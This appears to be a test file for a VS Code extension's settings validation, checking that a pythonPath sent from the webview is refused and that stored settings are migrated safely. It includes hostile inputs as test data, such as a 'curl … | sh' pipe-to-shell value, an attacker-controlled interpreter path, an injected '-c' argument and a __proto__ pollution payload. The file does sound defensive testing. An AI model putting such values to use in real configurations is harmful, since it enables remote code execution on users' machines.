// SPDX-License-Identifier: AGPL-3.0-only
// POF-P1-002 : schéma des réglages côté Host, refus d'un pythonPath venu du webview, migration.
const { expect } = require('chai');
const sinon = require('sinon');
const {
  SETTINGS_STATE_KEY,
  PYTHON_PATH_ATTESTATION_KEY,
  SETTINGS_DEFAULTS,
  migrateStoredSettings,
  readStoredSettings,
  validateSettingsUpdate,
} = require('../shared/settingsSchema');
const { createSettingsActions } = require('../static/hub/settingsActions');

const SELECTED_PYTHON = '/opt/pof venv/bin/python3';
const WEBVIEW_PYTHON = '/tmp/attacker/bin/python3';

// Memento minimal : `attested` simule une sélection native antérieure de ce pythonPath.
function makeStore(initial, { attested } = { attested: undefined }) {
  const values = new Map<string, any>([[SETTINGS_STATE_KEY, initial], [PYTHON_PATH_ATTESTATION_KEY, attested]]);
  return {
    get: (key, fallback) => (values.get(key) !== undefined ? values.get(key) : fallback),
    update: sinon.spy(async (key, next) => { values.set(key, next); }),
    current: () => values.get(SETTINGS_STATE_KEY),
    attested: () => values.get(PYTHON_PATH_ATTESTATION_KEY),
  };
}

function makeActions(store, selectPythonExecutable = sinon.stub().resolves({ ok: false, cancelled: true })) {
  const posted = [];
  const vscode = { window: { showErrorMessage: sinon.spy() } };
  const actions = createSettingsActions({
    panel: { webview: { postMessage: (message) => posted.push(message) } },
    context: { globalState: store },
    vscode,
    root: '/workspace',
    logChannel: { appendLine: () => {} },
    selectPythonExecutable,
  });
  return { actions, posted, vscode, selectPythonExecutable };
}

describe('settings schema (validateSettingsUpdate)', () => {
  it('rejects an unknown key', () => {
    const result = validateSettingsUpdate({ lang: 'en', injectedKey: 'x' }, {});
    expect(result.ok).to.equal(false);
    expect(result.errors.join(' ')).to.contain('injectedKey: unknown key');
  });

  it('rejects prototype keys sent by the webview', () => {
    const result = validateSettingsUpdate(JSON.parse('{"__proto__": {"polluted": true}}'), {});
    expect(result.ok).to.equal(false);
    expect(({} as any).polluted).to.equal(undefined);
  });

  it('checks types, enums and bounds', () => {
    for (const settings of [
      { aiTemperature: 3 },
      { aiTopP: 0 },
      { aiMaxTokens: 1.5 },
      { codeFontSize: '13' },
      { stringsMinLen: Number.NaN },
      { asmSyntax: 'nasm' },
      { lang: '<img>' },
      { enabledStaticFeatures: ['disasm', ''] },
      { enabledStaticFeatures: 'disasm' },
      { decompilerLocalPaths: { ghidra: 42 } },
      { aiPricingRules: [{ model: 'm', inputPerMillion: -1 }] },
      { aiPricingRules: [{ model: 'm', inputPerMillion: 1, extra: true }] },
    ]) {
      expect(validateSettingsUpdate(settings, {}).ok, JSON.stringify(settings)).to.equal(false);
    }
  });

  it('accepts the settings sent by the options panel', () => {
    const result = validateSettingsUpdate({
      ...SETTINGS_DEFAULTS,
      interfaceMode: 'simple',
      enabledStaticFeatures: ['disasm'],
      bindiffThreshold: 0.75,
      decompilerLocalPaths: { ghidra: '/opt/ghidra' },
      aiPricingRules: [{
        id: 'pricing-1', model: 'openai@gpt-*', inputPerMillion: 1.5, outputPerMillion: 3, effectiveDate: '2026-01-01', currency: 'USD',
      }],
    }, {});
    expect(result.ok, String(result.errors)).to.equal(true);
    expect(result.settings.interfaceMode).to.equal('simple');
  });

  it('refuses a pythonPath that was not selected natively, but allows keeping or clearing it', () => {
    const current = { pythonPath: SELECTED_PYTHON };
    const changed = validateSettingsUpdate({ pythonPath: WEBVIEW_PYTHON }, current);
    expect(changed.ok).to.equal(false);
    expect(changed.errors.join(' ')).to.contain('pythonPath: can only be set by the extension host');
    expect(validateSettingsUpdate({ pythonPath: WEBVIEW_PYTHON }, {}).ok).to.equal(false);
    expect(validateSettingsUpdate({ pythonPath: SELECTED_PYTHON }, current).ok).to.equal(true);
    expect(validateSettingsUpdate({ pythonPath: '' }, current).settings.pythonPath).to.equal('');
  });

  it('keeps host-managed values when the webview omits them', () => {
    const result = validateSettingsUpdate({ lang: 'en' }, { pythonPath: SELECTED_PYTHON });
    expect(result.settings).to.deep.equal({ pythonPath: SELECTED_PYTHON, lang: 'en' });
  });
});

describe('settings migration (migrateStoredSettings)', () => {
  it('drops unknown keys, invalid values and an arbitrary pythonPath', () => {
    const { settings, dropped } = migrateStoredSettings({
      lang: 'en',
      codeFontSize: 14,
      legacyFlag: true,
      asmSyntax: 42,
      pythonPath: 'curl https://example.invalid | sh',
    });
    expect(settings).to.deep.equal({ lang: 'en', codeFontSize: 14 });
    expect(dropped).to.have.members(['legacyFlag', 'asmSyntax', 'pythonPath']);
  });

  it('keeps only the pythonPath attested by a native selection', () => {
    for (const pythonPath of [SELECTED_PYTHON, '/usr/bin/python', '/usr/local/bin/python3.12']) {
      const attestedPythonPath = pythonPath;
      expect(migrateStoredSettings({ pythonPath }, { attestedPythonPath }).settings.pythonPath).to.equal(pythonPath);
    }
    for (const pythonPath of ['python3', '/bin/sh', '/usr/bin/python3 -c evil']) {
      const attestedPythonPath = pythonPath;
      expect(migrateStoredSettings({ pythonPath }, { attestedPythonPath }).dropped, pythonPath).to.deep.equal(['pythonPath']);
    }
  });

  it('drops a well-formed legacy pythonPath written by the webview before the update', () => {
    // Chemin absolu nommé python3 : la forme est conforme, mais aucune sélection native ne l'atteste.
    expect(migrateStoredSettings({ pythonPath: WEBVIEW_PYTHON }).dropped).to.deep.equal(['pythonPath']);
    expect(migrateStoredSettings({ pythonPath: WEBVIEW_PYTHON }, { attestedPythonPath: SELECTED_PYTHON }).settings)
      .to.deep.equal({});
    expect(readStoredSettings(makeStore({ pythonPath: WEBVIEW_PYTHON, lang: 'en' }))).to.deep.equal({ lang: 'en' });
  });

  it('accepts an empty pythonPath without attestation', () => {
    expect(migrateStoredSettings({ pythonPath: '' })).to.deep.equal({ settings: { pythonPath: '' }, dropped: [] });
  });

  it('handles missing and malformed stored settings', () => {
    expect(migrateStoredSettings(undefined)).to.deep.equal({ settings: {}, dropped: [] });
    expect(migrateStoredSettings('corrupted')).to.deep.equal({ settings: {}, dropped: ['<root>'] });
  });
});

describe('hub settings handlers', () => {
  it('does not store a save containing an unknown key', async () => {
    const store = makeStore({ lang: 'fr' });
    const { actions, posted, vscode } = makeActions(store);
    await actions.hubSaveSettings({ settings: { lang: 'en', injectedKey: 1 }, requestId: 7 });
    expect(store.update.called).to.equal(false);
    expect(posted).to.deep.include({ type: 'hubSettingsSaved', ok: false, errors: ['injectedKey: unknown key'], requestId: 7 });
    expect(vscode.window.showErrorMessage.calledOnce).to.equal(true);
  });

  it('refuses a pythonPath sent by the webview without a native selection', async () => {
    const store = makeStore({});
    const { actions, posted } = makeActions(store);
    await actions.hubSaveSettings({ settings: { pythonPath: WEBVIEW_PYTHON }, requestId: 3 });
    expect(store.update.called).to.equal(false);
    expect(posted[0]).to.include({ type: 'hubSettingsSaved', ok: false, requestId: 3 });
  });

  it('stores a valid save merged with the host-managed values', async () => {
    const store = makeStore({ pythonPath: SELECTED_PYTHON }, { attested: SELECTED_PYTHON });
    const { actions, posted } = makeActions(store);
    await actions.hubSaveSettings({ settings: { lang: 'en' }, requestId: 4 });
    expect(store.current()).to.deep.equal({ pythonPath: SELECTED_PYTHON, lang: 'en' });
    expect(posted).to.deep.equal([{ type: 'hubSettingsSaved', ok: true, requestId: 4 }]);
  });

  it('sends migrated settings completed with the defaults', async () => {
    const store = makeStore({ lang: 'en', legacyFlag: true, pythonPath: 'not a path' });
    const { actions, posted } = makeActions(store);
    await actions.hubGetSettings({ requestId: 1 });
    expect(posted[0].settings).to.deep.equal({ ...SETTINGS_DEFAULTS, lang: 'en' });
  });

  it('stores pythonPath only after a verified native selection', async () => {
    const store = makeStore({ lang: 'en' });
    const selectPythonExecutable = sinon.stub().resolves({ ok: true, path: SELECTED_PYTHON });
    const { actions, posted } = makeActions(store, selectPythonExecutable);
    await actions.hubSelectPythonPath({ requestId: 9 });
    expect(selectPythonExecutable.calledOnce).to.equal(true);
    expect(store.current()).to.deep.equal({ lang: 'en', pythonPath: SELECTED_PYTHON });
    expect(store.attested()).to.equal(SELECTED_PYTHON);
    expect(posted[0]).to.include({ type: 'hubSettings', requestId: 9 });
    expect(posted[0].settings.pythonPath).to.equal(SELECTED_PYTHON);
  });

  it('keeps a save acknowledged while the native picker was open', async () => {
    const store = makeStore({ lang: 'fr' });
    let actions;
    // Sauvegarde différée de la langue, acquittée pendant que le sélecteur est ouvert.
    const selectPythonExecutable = sinon.stub().callsFake(async () => {
      await actions.hubSaveSettings({ settings: { lang: 'en' }, requestId: 11 });
      return { ok: true, path: SELECTED_PYTHON };
    });
    ({ actions } = makeActions(store, selectPythonExecutable));
    await actions.hubSelectPythonPath({ requestId: 12 });
    expect(store.current()).to.deep.equal({ lang: 'en', pythonPath: SELECTED_PYTHON });
  });

  it('keeps the current pythonPath when the selection is rejected', async () => {
    const store = makeStore({ pythonPath: SELECTED_PYTHON }, { attested: SELECTED_PYTHON });
    const { actions, vscode } = makeActions(store, sinon.stub().resolves({ ok: false, error: 'not Python' }));
    await actions.hubSelectPythonPath({ requestId: 2 });
    expect(store.update.called).to.equal(false);
    expect(vscode.window.showErrorMessage.calledOnce).to.equal(true);
  });

  it('resets to an independent copy of the defaults', async () => {
    const store = makeStore({ pythonPath: SELECTED_PYTHON }, { attested: SELECTED_PYTHON });
    const { actions } = makeActions(store);
    await actions.hubResetSettings({ requestId: 5 });
    expect(store.current()).to.deep.equal(SETTINGS_DEFAULTS);
    expect(store.attested()).to.equal(undefined);
    store.current().enabledStaticFeatures.push('disasm');
    expect(SETTINGS_DEFAULTS.enabledStaticFeatures).to.deep.equal([]);
  });
});
